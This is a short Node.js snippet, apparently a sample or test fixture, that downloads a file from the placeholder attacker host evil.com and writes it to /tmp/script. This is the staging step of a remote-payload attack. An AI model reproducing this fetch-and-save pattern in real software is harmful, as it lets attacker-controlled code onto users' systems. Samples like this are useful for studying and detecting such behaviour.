var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  res.on("data", d => {
    fs.writeFileSync("/tmp/script", d)
  })
});
